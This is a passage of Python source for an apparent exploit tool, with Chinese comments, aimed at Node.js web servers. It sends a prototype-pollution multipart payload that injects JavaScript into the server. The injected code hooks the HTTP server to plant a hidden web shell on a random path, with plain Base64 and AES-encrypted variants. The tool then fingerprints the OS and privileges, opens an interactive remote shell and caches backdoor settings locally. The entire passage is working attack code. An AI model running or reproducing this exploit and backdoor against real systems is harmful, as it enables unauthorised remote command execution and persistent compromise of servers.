        js_payload = f"""(async()=>{{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){{if(event==='request'){{const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='{random_path}'&&req.method==='GET'){{let body='';req.on('data',chunk=>body+=chunk);req.on('end',()=>{{try{{const cmd=Buffer.from(body,'base64').toString('utf8')||'whoami';cp.exec(cmd,(err,stdout,stderr)=>{{res.writeHead(200,{{'Content-Type':'application/json','Access-Control-Allow-Origin':'*'}});res.end(JSON.stringify({{success:!err,stdout,stderr,error:err?err.message:null}}));}});}}catch(e){{res.writeHead(400,{{'Content-Type':'application/json'}});res.end(JSON.stringify({{success:false,error:e.message}}));}}}});return true;}}}}return originalEmit.apply(this,arguments);}};}})()\x3b"""

        payload_template = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": js_payload,
                "_chunks": "$Q2",
                "_formData": {"get": "$1:constructor:constructor"}
            }
        }

        boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
        body_parts = [f'------{boundary}', 'Content-Disposition: form-data; name="0"', '', json.dumps(payload_template, ensure_ascii=False),
                      f'------{boundary}', 'Content-Disposition: form-data; name="1"', '', '"$@0"',
                      f'------{boundary}', 'Content-Disposition: form-data; name="2"', '', '[]', f'------{boundary}--']
        body = '\r\n'.join(body_parts)
        headers = {'Content-Type': f'multipart/form-data; boundary=----{boundary}'}

        exec_url = f"{parsed.scheme}://{parsed.netloc}{random_path}"

        print()
        print(f"[*] Step 2: Injecting HTTP listener...")
        print(f"    ├── Target: {self.target_url}")
        print(f"    └── Sending payload...")

        def send_payload():
            try:
                self.session.post(self.target_url, data=body.encode('utf-8'), headers=headers, allow_redirects=False, timeout=60)
            except:
                pass

        payload_thread = threading.Thread(target=send_payload, daemon=True)
        payload_thread.start()
        time.sleep(1)
        print(f"    └── \033[1;32m✓ Payload injected!\033[0m")

        print()
        print(f"[*] Step 3: Executing command...")
        print(f"    ├── Endpoint: {exec_url}")
        print(f"    └── Command: {command}")
        try:
            cmd_b64 = base64.b64encode(command.encode('utf-8')).decode()
            resp = self.session.post(exec_url, data=cmd_b64, timeout=30)
            if resp.status_code == 200:
                result = resp.json()
                if result.get('success'):
                    # 保存配置到本地
                    self._save_exp2_config(random_path)
                    print(f"    └── \033[1;32m✓ Success!\033[0m")
                    print()
                    return True, result.get('stdout', '') + result.get('stderr', '')
                else:
                    return False, result.get('error', 'Unknown error')
            return False, f"HTTP {resp.status_code}"
        except Exception as e:
            return False, str(e)

    def execute_command_v3(self, command):
        """
        EXP3 模式执行单命令 (HTTP hijack + POST + AES-256-CBC)
        支持本地配置缓存
        """
        # 打印 Banner
        self._print_exp_banner('exp3')

        parsed = urlparse(self.base_url)

        # AES 加密/解密函数（需要 key 和 iv 参数）
        def aes_encrypt(plaintext, key, iv):
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import pad
                cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
                ct_bytes = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
                return base64.b64encode(ct_bytes).decode('utf-8')
            except ImportError:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.backends import default_backend
                block_size = 16
                padding_len = block_size - (len(plaintext.encode('utf-8')) % block_size)
                padded = plaintext.encode('utf-8') + bytes([padding_len] * padding_len)
                cipher = Cipher(algorithms.AES(key.encode()), modes.CBC(iv.encode()), backend=default_backend())
                encryptor = cipher.encryptor()
                ct = encryptor.update(padded) + encryptor.finalize()
                return base64.b64encode(ct).decode('utf-8')

        def aes_decrypt(ciphertext, key, iv):
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import unpad
                ct = base64.b64decode(ciphertext)
                cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
                pt = unpad(cipher.decrypt(ct), AES.block_size)
                return pt.decode('utf-8')
            except ImportError:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.backends import default_backend
                ct = base64.b64decode(ciphertext)
                cipher = Cipher(algorithms.AES(key.encode()), modes.CBC(iv.encode()), backend=default_backend())
                decryptor = cipher.decryptor()
                padded = decryptor.update(ct) + decryptor.finalize()
                padding_len = padded[-1]
                return padded[:-padding_len].decode('utf-8')

        # 尝试加载本地配置
        saved_path, saved_key, saved_iv = self._load_exp3_config()

        # 如果有保存的配置，先测试是否有效
        if saved_path and saved_key and saved_iv:
            exec_url = f"{parsed.scheme}://{parsed.netloc}{saved_path}"
            print(f"[*] Step 1: Checking saved configuration...")
            print(f"    └── Saved path: {saved_path}")
            try:
                # 使用 echo 随机字符串验证配置
                test_token = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                enc_cmd = aes_encrypt(f'echo {test_token}', saved_key, saved_iv)
                resp = self.session.post(exec_url, data=enc_cmd, timeout=5)
                if resp.status_code == 200:
                    dec_result = aes_decrypt(resp.text, saved_key, saved_iv)
                    result = json.loads(dec_result)
                    stdout_result = result.get('stdout', '')
                    # 检查返回值是否包含我们的随机字符串
                    if result.get('success') and test_token in stdout_result:
                        print(f"    └── \033[1;32m✓ Config valid! (echo verified)\033[0m")
                        print()
                        print(f"[*] Step 2: Executing command...")
                        print(f"    └── Command: {command}")
                        # 执行实际命令
                        enc_cmd = aes_encrypt(command, saved_key, saved_iv)
                        resp = self.session.post(exec_url, data=enc_cmd, timeout=30)
                        if resp.status_code == 200:
                            dec_result = aes_decrypt(resp.text, saved_key, saved_iv)
                            result = json.loads(dec_result)
                            if result.get('success'):
                                print(f"    └── \033[1;32m✓ Success!\033[0m")
                                print()
                                return True, result.get('stdout', '') + result.get('stderr', '')
                            else:
                                return False, result.get('error', 'Unknown error')
                        return False, f"HTTP {resp.status_code}"
            except:
                pass
            print(f"    └── \033[1;31m✗ Config invalid, need re-injection\033[0m")
            print()

        # 生成新的随机路径和 AES 密钥
        random_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=8))
        aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        aes_iv = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

        exec_url = f"{parsed.scheme}://{parsed.netloc}{random_path}"

        print(f"[*] Step 1: Generating payload...")
        print(f"    ├── Random path: {random_path}")
        print(f"    ├── AES Key: {aes_key[:16]}...")
        print(f"    └── Encryption: AES-256-CBC")

        js_payload = f"""(async()=>{{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const crypto=await import('node:crypto');const KEY='{aes_key}';const IV='{aes_iv}';const decrypt=(enc)=>{{const decipher=crypto.createDecipheriv('aes-256-cbc',Buffer.from(KEY),Buffer.from(IV));let dec=decipher.update(enc,'base64','utf8');dec+=decipher.final('utf8');return dec;}};const encrypt=(text)=>{{const cipher=crypto.createCipheriv('aes-256-cbc',Buffer.from(KEY),Buffer.from(IV));let enc=cipher.update(text,'utf8','base64');enc+=cipher.final('base64');return enc;}};const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){{if(event==='request'){{const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='{random_path}'&&req.method==='GET'){{let body='';req.on('data',chunk=>body+=chunk);req.on('end',()=>{{try{{const cmd=decrypt(body);cp.exec(cmd,(err,stdout,stderr)=>{{const result=JSON.stringify({{success:!err,stdout,stderr,error:err?err.message:null}});const encResult=encrypt(result);res.writeHead(200,{{'Content-Type':'text/plain','Access-Control-Allow-Origin':'*'}});res.end(encResult);}});}}catch(e){{res.writeHead(400,{{'Content-Type':'text/plain'}});res.end(encrypt(JSON.stringify({{success:false,error:e.message}})));}}}});return true;}}}}return originalEmit.apply(this,arguments);}};}})()\x3b"""

        payload_template = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": js_payload,
                "_chunks": "$Q2",
                "_formData": {"get": "$1:constructor:constructor"}
            }
        }

        boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
        body_parts = [f'------{boundary}', 'Content-Disposition: form-data; name="0"', '', json.dumps(payload_template, ensure_ascii=False),
                      f'------{boundary}', 'Content-Disposition: form-data; name="1"', '', '"$@0"',
                      f'------{boundary}', 'Content-Disposition: form-data; name="2"', '', '[]', f'------{boundary}--']
        body = '\r\n'.join(body_parts)
        headers = {'Content-Type': f'multipart/form-data; boundary=----{boundary}'}

        print()
        print(f"[*] Step 2: Injecting HTTP listener...")
        print(f"    ├── Target: {self.target_url}")
        print(f"    └── Sending encrypted payload...")

        def send_payload():
            try:
                self.session.post(self.target_url, data=body.encode('utf-8'), headers=headers, allow_redirects=False, timeout=60)
            except:
                pass

        payload_thread = threading.Thread(target=send_payload, daemon=True)
        payload_thread.start()
        time.sleep(1)
        print(f"    └── \033[1;32m✓ Payload injected!\033[0m")

        print()
        print(f"[*] Step 3: Executing command...")
        print(f"    ├── Endpoint: {exec_url}")
        print(f"    └── Command: {command}")
        try:
            enc_cmd = aes_encrypt(command, aes_key, aes_iv)
            resp = self.session.post(exec_url, data=enc_cmd, timeout=30)
            if resp.status_code == 200:
                dec_result = aes_decrypt(resp.text, aes_key, aes_iv)
                result = json.loads(dec_result)
                if result.get('success'):
                    # 保存配置到本地
                    self._save_exp3_config(random_path, aes_key, aes_iv)
                    print(f"    └── \033[1;32m✓ Success!\033[0m")
                    print()
                    print(f"\033[1;35m{'─' * 50}\033[0m")
                    print(f"\033[1;35mOutput:\033[0m")
                    print(f"\033[1;35m{'─' * 50}\033[0m")
                    return True, result.get('stdout', '') + result.get('stderr', '')
                else:
                    return False, result.get('error', 'Unknown error')
            return False, f"HTTP {resp.status_code}"
        except Exception as e:
            return False, str(e)

    def interactive_shell_v2(self):
        """
        启动交互式 shell V2 (EXP2模式)
        使用 HTTP 劫持方式执行命令
        - POST 请求
        - Base64 编码命令
        - 随机路径
        """
        # 生成随机路径
        random_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=8))

        print(f"[*] EXP2 Mode - HTTP Hijack Shell (POST + Base64)")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Random path: {random_path}")
        print(f"[*] Injecting HTTP listener...")

        # 构造 payload - HTTP 劫持 (POST + Base64)
        # 监听 POST 请求，从 body 读取 base64 编码的命令
        js_payload = f"""(async()=>{{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){{if(event==='request'){{const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='{random_path}'&&req.method==='POST'){{let body='';req.on('data',chunk=>body+=chunk);req.on('end',()=>{{try{{const cmd=Buffer.from(body,'base64').toString('utf8')||'whoami';cp.exec(cmd,(err,stdout,stderr)=>{{res.writeHead(200,{{'Content-Type':'application/json','Access-Control-Allow-Origin':'*'}});res.end(JSON.stringify({{success:!err,stdout,stderr,error:err?err.message:null}}));}});}}catch(e){{res.writeHead(400,{{'Content-Type':'application/json'}});res.end(JSON.stringify({{success:false,error:e.message}}));}}}});return true;}}}}return originalEmit.apply(this,arguments);}};}})()\x3b"""

        payload_template = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": js_payload,
                "_chunks": "$Q2",
                "_formData": {
                    "get": "$1:constructor:constructor"
                }
            }
        }

        # 发送 payload
        boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
        body_parts = []

        payload_json = json.dumps(payload_template, ensure_ascii=False)
        body_parts.append(f'------{boundary}')
        body_parts.append('Content-Disposition: form-data; name="0"')
        body_parts.append('')
        body_parts.append(payload_json)

        body_parts.append(f'------{boundary}')
        body_parts.append('Content-Disposition: form-data; name="1"')
        body_parts.append('')
        body_parts.append('"$@0"')

        body_parts.append(f'------{boundary}')
        body_parts.append('Content-Disposition: form-data; name="2"')
        body_parts.append('')
        body_parts.append('[]')

        body_parts.append(f'------{boundary}--')
        body = '\r\n'.join(body_parts)

        headers = {
            'Content-Type': f'multipart/form-data; boundary=----{boundary}'
        }

        # 构造命令执行 URL
        parsed = urlparse(self.base_url)
        exec_url = f"{parsed.scheme}://{parsed.netloc}{random_path}"

        # 发送 payload（不等待响应，请求会卡住）
        def send_payload():
            try:
                self.session.post(
                    self.target_url,
                    data=body.encode('utf-8'),
                    headers=headers,
                    allow_redirects=False,
                    timeout=60
                )
            except:
                pass  # 忽略超时等错误

        # 异步发送 payload
        payload_thread = threading.Thread(target=send_payload, daemon=True)
        payload_thread.start()
        print(f"[+] Payload sent (async)")

        # 等待 1 秒让 payload 生效
        time.sleep(1)

        print(f"[+] \033[1;32mHTTP listener should be active!\033[0m")
        print(f"[+] Execute URL: POST {exec_url}")
        print(f"[*] Body: base64(<command>)")
        print(f"[*] Example: curl -X POST {exec_url} -d $(echo -n 'whoami' | base64)")
        print()

        # 定义执行命令的辅助函数
        # 返回: (success, result, connected)
        # connected: True 表示连接成功（能收到 JSON 响应），即使命令失败
        def exec_cmd_v2(cmd):
            """通过 HTTP POST + Base64 执行命令"""
            try:
                cmd_b64 = base64.b64encode(cmd.encode('utf-8')).decode()
                resp = self.session.post(exec_url, data=cmd_b64, timeout=30)
                if resp.status_code == 200:
                    result = resp.json()
                    if result.get('success'):
                        return True, result.get('stdout', '') + result.get('stderr', ''), True
                    else:
                        # 命令失败但连接成功
                        return False, result.get('stdout', '') + result.get('stderr', ''), True
                else:
                    return False, f"HTTP {resp.status_code}", False
            except Exception as e:
                return False, str(e), False

        # 测试连接并检测系统信息
        print(f"[*] Testing connection and detecting OS...")

        # 使用 pwd 或 cd 来测试连接（这些命令几乎不会失败）
        success, result, connected = exec_cmd_v2('pwd')
        if not connected:
            # 尝试 Windows 的 cd 命令
            success, result, connected = exec_cmd_v2('cd')

        if connected:
            print(f"[+] \033[1;32mVULNERABLE!\033[0m Connection successful")
            if success:
                print(f"[+] Current dir: {result.strip()}")

            # 检测操作系统
            os_type = None
            print(f"[*] Detecting target OS...")

            # 尝试 uname -a
            success, result, _ = exec_cmd_v2('uname -a')
            if success and result.strip():
                result_lower = result.lower()
                if 'linux' in result_lower:
                    print(f"[+] \033[1;32mOS: Linux\033[0m")
                    print(f"[+] {result.strip()}")
                    os_type = 'linux'
                elif 'darwin' in result_lower:
                    print(f"[+] \033[1;32mOS: macOS\033[0m")
                    print(f"[+] {result.strip()}")
                    os_type = 'macos'
                elif 'bsd' in result_lower:
                    print(f"[+] \033[1;32mOS: BSD\033[0m")
                    print(f"[+] {result.strip()}")
                    os_type = 'bsd'

            # 尝试 Windows
            if not os_type:
                success, result, _ = exec_cmd_v2('ver')
                if success and result.strip() and 'windows' in result.lower():
                    print(f"[+] \033[1;32mOS: Windows\033[0m")
                    print(f"[+] {result.strip()}")
                    os_type = 'windows'

            if not os_type:
                print(f"[*] \033[1;33mOS: Unknown\033[0m")
                os_type = 'unknown'

            self.os_type = os_type

            # 获取用户权限信息
            if os_type in ['linux', 'macos', 'bsd']:
                print(f"[*] Executing: id")
                success, result, _ = exec_cmd_v2('id')
                if success and result.strip():
                    print(f"[+] \033[1;36m{result.strip()}\033[0m")
            elif os_type == 'windows':
                print(f"[*] Executing: whoami /all")
                success, result, _ = exec_cmd_v2('whoami /priv')
                if success and result.strip():
                    print(f"[+] \033[1;36m{result.strip()[:200]}\033[0m")
        else:
            print(f"[-] \033[1;31mConnection failed!\033[0m {result}")
            print(f"[*] The listener may not be active yet. Try manually:")
            print(f"    curl -X POST {exec_url} -d $(echo -n 'whoami' | base64)")
            return

        print()
        print(f"============================================================")
        print(f"Interactive Shell V2 (POST + Base64 Mode)")
        print(f"Type 'exit' or 'quit' to exit")
        print(f"============================================================")

        while True:
            try:
                command = input("$ ").strip()

                if not command:
                    continue

                if command.lower() in ['exit', 'quit']:
                    break

                # 通过 HTTP POST + Base64 执行命令
                try:
                    cmd_b64 = base64.b64encode(command.encode('utf-8')).decode()
                    resp = self.session.post(exec_url, data=cmd_b64, timeout=30)

                    if resp.status_code == 200:
                        try:
                            result = resp.json()
                            if result.get('success'):
                                stdout = result.get('stdout', '')
                                stderr = result.get('stderr', '')
                                if stdout:
                                    print(stdout.rstrip())
                                if stderr:
                                    print(f"\033[1;31m{stderr.rstrip()}\033[0m", file=sys.stderr)
                            else:
                                print(f"Error: {result.get('error')}", file=sys.stderr)
                        except json.JSONDecodeError:
                            print(resp.text)
                    else:
                        print(f"HTTP Error: {resp.status_code}", file=sys.stderr)

                except requests.exceptions.Timeout:
                    print("Error: Request timeout", file=sys.stderr)
                except Exception as e:
                    print(f"Error: {str(e)}", file=sys.stderr)

            except KeyboardInterrupt:
                print("\n")
                break
            except EOFError:
                print("")
                break

    def _get_config_file_path(self, mode='exp3'):
        """获取配置文件路径"""
        if mode == 'exp2':
            return ".exp2_config.json"
        else:  # exp3
            return ".exp3_config.json"

    def _load_exp2_config(self):
        """加载本地保存的 EXP2 配置"""
        config_file = self._get_config_file_path('exp2')
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    configs = json.load(f)
                    # 查找当前目标的配置
                    if self.base_url in configs:
                        config = configs[self.base_url]
                        return config.get('path'), None, None
            except:
                pass
        return None, None, None

    def _save_exp2_config(self, random_path):
        """保存 EXP2 配置到本地"""
        config_file = self._get_config_file_path('exp2')
        configs = {}

        # 读取现有配置
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    configs = json.load(f)
            except:
                pass

        # 添加/更新当前目标的配置
        configs[self.base_url] = {
            'path': random_path,
            'created_at': time.strftime('%Y-%m-%d %H:%M:%S')
        }

        try:
            with open(config_file, 'w') as f:
                json.dump(configs, f, indent=2)
        except Exception as e:
            pass

    def _load_exp3_config(self):
        """加载本地保存的 EXP3 配置"""
        config_file = self._get_config_file_path('exp3')
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    configs = json.load(f)
                    # 查找当前目标的配置
                    if self.base_url in configs:
                        config = configs[self.base_url]
                        return config.get('path'), config.get('key'), config.get('iv')
            except:
                pass
        return None, None, None

    def _save_exp3_config(self, random_path, aes_key, aes_iv):
        """保存 EXP3 配置到本地"""
        config_file = self._get_config_file_path('exp3')
        configs = {}

        # 读取现有配置
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    configs = json.load(f)
            except:
                pass

        # 添加/更新当前目标的配置
        configs[self.base_url] = {
            'path': random_path,
            'key': aes_key,
            'iv': aes_iv,
            'created_at': time.strftime('%Y-%m-%d %H:%M:%S')
        }

        try:
            with open(config_file, 'w') as f:
                json.dump(configs, f, indent=2)
            print(f"[+] Config saved to: {config_file}")
        except Exception as e:
            print(f"[-] Failed to save config: {e}")

    def _delete_exp3_config(self):
        """删除当前目标的配置"""
        config_file = self._get_config_file_path('exp3')
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    configs = json.load(f)
                if self.base_url in configs:
                    del configs[self.base_url]
                    with open(config_file, 'w') as f:
                        json.dump(configs, f, indent=2)
            except:
                pass

    def interactive_shell_v3(self):
        """
        启动交互式 shell V3 (EXP3模式)
        使用 HTTP 劫持方式执行命令
        - POST 请求
        - AES-256-CBC 加密命令
        - 随机路径和密钥
        - 支持本地配置缓存
        """
        print(f"[*] EXP3 Mode - HTTP Hijack Shell (POST + AES-256-CBC)")
        print(f"[*] Target: {self.target_url}")

        # 尝试加载本地配置
        saved_path, saved_key, saved_iv = self._load_exp3_config()
        use_saved_config = False

        if saved_path and saved_key and saved_iv:
            print(f"[*] Found saved config, testing...")
            print(f"[*] Saved path: {saved_path}")

            # 构造执行 URL
            parsed = urlparse(self.base_url)
            test_exec_url = f"{parsed.scheme}://{parsed.netloc}{saved_path}"

            # 定义临时加密函数用于测试
            def test_aes_encrypt(plaintext, key, iv):
                try:
                    from Crypto.Cipher import AES
                    from Crypto.Util.Padding import pad
                    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
                    ct_bytes = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
                    return base64.b64encode(ct_bytes).decode('utf-8')
                except ImportError:
                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                    from cryptography.hazmat.backends import default_backend
                    block_size = 16
                    padding_len = block_size - (len(plaintext.encode('utf-8')) % block_size)
                    padded = plaintext.encode('utf-8') + bytes([padding_len] * padding_len)
                    cipher = Cipher(algorithms.AES(key.encode()), modes.CBC(iv.encode()), backend=default_backend())
                    encryptor = cipher.encryptor()
                    ct = encryptor.update(padded) + encryptor.finalize()
                    return base64.b64encode(ct).decode('utf-8')

            def test_aes_decrypt(ciphertext, key, iv):
                try:
                    from Crypto.Cipher import AES
                    from Crypto.Util.Padding import unpad
                    ct = base64.b64decode(ciphertext)
                    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
                    pt = unpad(cipher.decrypt(ct), AES.block_size)
                    return pt.decode('utf-8')
                except ImportError:
                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                    from cryptography.hazmat.backends import default_backend
                    ct = base64.b64decode(ciphertext)
                    cipher = Cipher(algorithms.AES(key.encode()), modes.CBC(iv.encode()), backend=default_backend())
                    decryptor = cipher.decryptor()
                    padded = decryptor.update(ct) + decryptor.finalize()
                    padding_len = padded[-1]
                    return padded[:-padding_len].decode('utf-8')

            # 测试保存的配置是否有效
            try:
                enc_cmd = test_aes_encrypt('whoami', saved_key, saved_iv)
                resp = self.session.post(test_exec_url, data=enc_cmd, timeout=5)
                if resp.status_code == 200:
                    dec_result = test_aes_decrypt(resp.text, saved_key, saved_iv)
                    result = json.loads(dec_result)
                    if result.get('success'):
                        print(f"[+] \033[1;32mSaved config is valid!\033[0m")
                        print(f"[+] whoami: {result.get('stdout', '').strip()}")
                        use_saved_config = True
                        random_path = saved_path
                        aes_key = saved_key
                        aes_iv = saved_iv
            except Exception as e:
                print(f"[-] Saved config test failed: {e}")

        if not use_saved_config:
            # 生成新的随机路径和 AES 密钥
            random_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=8))
            aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            aes_iv = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

            print(f"[*] Generating new config...")
            print(f"[*] Random path: {random_path}")
            print(f"[*] AES Key: {aes_key}")
            print(f"[*] AES IV: {aes_iv}")
            print(f"[*] Injecting HTTP listener...")

        # 构造命令执行 URL
        parsed = urlparse(self.base_url)
        exec_url = f"{parsed.scheme}://{parsed.netloc}{random_path}"

        # AES 加密/解密函数
        def aes_encrypt(plaintext):
            """AES-256-CBC 加密"""
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import pad
                cipher = AES.new(aes_key.encode(), AES.MODE_CBC, aes_iv.encode())
                ct_bytes = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
                return base64.b64encode(ct_bytes).decode('utf-8')
            except ImportError:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.backends import default_backend
                block_size = 16
                padding_len = block_size - (len(plaintext.encode('utf-8')) % block_size)
                padded = plaintext.encode('utf-8') + bytes([padding_len] * padding_len)
                cipher = Cipher(algorithms.AES(aes_key.encode()), modes.CBC(aes_iv.encode()), backend=default_backend())
                encryptor = cipher.encryptor()
                ct = encryptor.update(padded) + encryptor.finalize()
                return base64.b64encode(ct).decode('utf-8')

        def aes_decrypt(ciphertext):
            """AES-256-CBC 解密"""
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import unpad
                ct = base64.b64decode(ciphertext)
                cipher = AES.new(aes_key.encode(), AES.MODE_CBC, aes_iv.encode())
                pt = unpad(cipher.decrypt(ct), AES.block_size)
                return pt.decode('utf-8')
            except ImportError:
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.backends import default_backend
                ct = base64.b64decode(ciphertext)
                cipher = Cipher(algorithms.AES(aes_key.encode()), modes.CBC(aes_iv.encode()), backend=default_backend())
                decryptor = cipher.decryptor()
                padded = decryptor.update(ct) + decryptor.finalize()
                padding_len = padded[-1]
                return padded[:-padding_len].decode('utf-8')

        # 定义执行命令的辅助函数
        # 返回: (success, result, connected)
        # connected: True 表示连接成功（能收到有效响应），即使命令失败
        def exec_cmd_v3(cmd):
            """通过 AES 加密执行命令"""
            try:
                enc_cmd = aes_encrypt(cmd)
                resp = self.session.post(exec_url, data=enc_cmd, timeout=30)
                if resp.status_code == 200:
                    dec_result = aes_decrypt(resp.text)
                    result = json.loads(dec_result)
                    if result.get('success'):
                        return True, result.get('stdout', '') + result.get('stderr', ''), True
                    else:
                        # 命令失败但连接成功
                        return False, result.get('stdout', '') + result.get('stderr', ''), True
                else:
                    return False, f"HTTP {resp.status_code}", False
            except Exception as e:
                return False, str(e), False

        # 如果使用保存的配置，直接跳过注入步骤
        if not use_saved_config:
            # 构造 payload - HTTP 劫持 (POST + AES)
            js_payload = f"""(async()=>{{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const crypto=await import('node:crypto');const KEY='{aes_key}';const IV='{aes_iv}';const decrypt=(enc)=>{{const decipher=crypto.createDecipheriv('aes-256-cbc',Buffer.from(KEY),Buffer.from(IV));let dec=decipher.update(enc,'base64','utf8');dec+=decipher.final('utf8');return dec;}};const encrypt=(text)=>{{const cipher=crypto.createCipheriv('aes-256-cbc',Buffer.from(KEY),Buffer.from(IV));let enc=cipher.update(text,'utf8','base64');enc+=cipher.final('base64');return enc;}};const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){{if(event==='request'){{const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='{random_path}'&&req.method==='POST'){{let body='';req.on('data',chunk=>body+=chunk);req.on('end',()=>{{try{{const cmd=decrypt(body);cp.exec(cmd,(err,stdout,stderr)=>{{const result=JSON.stringify({{success:!err,stdout,stderr,error:err?err.message:null}});const encResult=encrypt(result);res.writeHead(200,{{'Content-Type':'text/plain','Access-Control-Allow-Origin':'*'}});res.end(encResult);}});}}catch(e){{res.writeHead(400,{{'Content-Type':'text/plain'}});res.end(encrypt(JSON.stringify({{success:false,error:e.message}})));}}}});return true;}}}}return originalEmit.apply(this,arguments);}};}})()\x3b"""

            payload_template = {
                "then": "$1:__proto__:then",
                "status": "resolved_model",
                "reason": -1,
                "value": '{"then":"$B1337"}',
                "_response": {
                    "_prefix": js_payload,
                    "_chunks": "$Q2",
                    "_formData": {
                        "get": "$1:constructor:constructor"
                    }
                }
            }

            # 发送 payload
            boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
            body_parts = []

            payload_json = json.dumps(payload_template, ensure_ascii=False)
            body_parts.append(f'------{boundary}')
            body_parts.append('Content-Disposition: form-data; name="0"')
            body_parts.append('')
            body_parts.append(payload_json)

            body_parts.append(f'------{boundary}')
            body_parts.append('Content-Disposition: form-data; name="1"')
            body_parts.append('')
            body_parts.append('"$@0"')

            body_parts.append(f'------{boundary}')
            body_parts.append('Content-Disposition: form-data; name="2"')
            body_parts.append('')
            body_parts.append('[]')

            body_parts.append(f'------{boundary}--')
            body = '\r\n'.join(body_parts)

            headers = {
                'Content-Type': f'multipart/form-data; boundary=----{boundary}'
            }

            # 发送 payload（不等待响应）
            def send_payload():
                try:
                    self.session.post(
                        self.target_url,
                        data=body.encode('utf-8'),
                        headers=headers,
                        allow_redirects=False,
                        timeout=60
                    )
                except:
                    pass

            payload_thread = threading.Thread(target=send_payload, daemon=True)
            payload_thread.start()
            print(f"[+] Payload sent (async)")

            time.sleep(1)

            print(f"[+] \033[1;32mHTTP listener should be active!\033[0m")
            print(f"[+] Execute URL: POST {exec_url}")
            print(f"[*] Body: AES-256-CBC(command)")
            print()

            # 测试连接并检测系统信息
            print(f"[*] Testing connection and detecting OS...")

            # 使用 pwd 或 cd 来测试连接（这些命令几乎不会失败）
            success, result, connected = exec_cmd_v3('pwd')
            if not connected:
                # 尝试 Windows 的 cd 命令
                success, result, connected = exec_cmd_v3('cd')

            if connected:
                print(f"[+] \033[1;32mVULNERABLE!\033[0m Connection successful")
                if success:
                    print(f"[+] Current dir: {result.strip()}")
                # 保存配置到本地
                self._save_exp3_config(random_path, aes_key, aes_iv)
            else:
                print(f"[-] \033[1;31mConnection failed!\033[0m {result}")
                print(f"[*] The listener may not be active yet.")
                self._delete_exp3_config()
                return
        else:
            # 使用保存的配置，已经验证成功
            print(f"[+] Using cached config, skipping payload injection")
            connected = True  # 已验证连接成功

        # 检测操作系统
        os_type = None
        print(f"[*] Detecting target OS...")

        # 尝试 uname -a
        uname_success, uname_result, _ = exec_cmd_v3('uname -a')
        if uname_success and uname_result.strip():
            result_lower = uname_result.lower()
            if 'linux' in result_lower:
                print(f"[+] \033[1;32mOS: Linux\033[0m")
                print(f"[+] {uname_result.strip()}")
                os_type = 'linux'
            elif 'darwin' in result_lower:
                print(f"[+] \033[1;32mOS: macOS\033[0m")
                print(f"[+] {uname_result.strip()}")
                os_type = 'macos'
            elif 'bsd' in result_lower:
                print(f"[+] \033[1;32mOS: BSD\033[0m")
                print(f"[+] {uname_result.strip()}")
                os_type = 'bsd'

        # 尝试 Windows
        if not os_type:
            ver_success, ver_result, _ = exec_cmd_v3('ver')
            if ver_success and ver_result.strip() and 'windows' in ver_result.lower():
                print(f"[+] \033[1;32mOS: Windows\033[0m")
                print(f"[+] {ver_result.strip()}")
                os_type = 'windows'

        if not os_type:
            print(f"[*] \033[1;33mOS: Unknown\033[0m")
            os_type = 'unknown'

        self.os_type = os_type

